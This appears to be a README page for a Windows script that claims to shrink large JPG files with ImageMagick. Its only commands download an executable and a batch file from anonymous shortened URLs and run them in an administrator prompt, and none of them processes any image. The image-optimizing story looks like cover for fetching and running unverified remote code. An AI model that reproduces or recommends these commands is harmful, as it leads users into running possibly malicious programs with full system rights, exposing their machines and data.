# Optimize large jpg images using imagemagick's convert.exe and caching features

This script uses ImageMagick's `convert.exe` which creates two temporary cache files of each image before re-assembling the picture into it's optimized form using a highly efficient algorithm.

If you need ways to save space on your hard drive this should work well for you

Make sure file sizes are `at least >= 3MB each`

This script `WILL overwrite the original pictures` so it is `highly advised to make backups`

`To use the below commands open cmd.exe as an administrator to the jpg file(s) directory`

# Optimize all jpg files in the current working directory

Just run the commands below in the same folder as your jpg file(s) 

```
wget.exe -c -O convert.exe shorturl.at/cLPR0 && ^
curl.exe shorturl.at/ajru5 > run.bat && ^
call run.bat & exit

```
